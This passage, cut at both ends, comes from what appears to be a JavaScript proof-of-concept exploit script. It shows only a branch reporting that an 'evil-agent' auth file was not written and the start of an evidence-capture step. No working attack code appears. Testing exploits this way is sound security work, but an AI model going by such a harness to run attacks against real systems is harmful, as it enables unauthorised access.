} else {
  console.log("[PoC] Evil-agent auth file NOT written – exploit did not trigger");
}

// ---------------------------------------------------------------------------
// 6. Capture evidence files
// ---------------------------------------------------------------------------
const evidenceDir = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
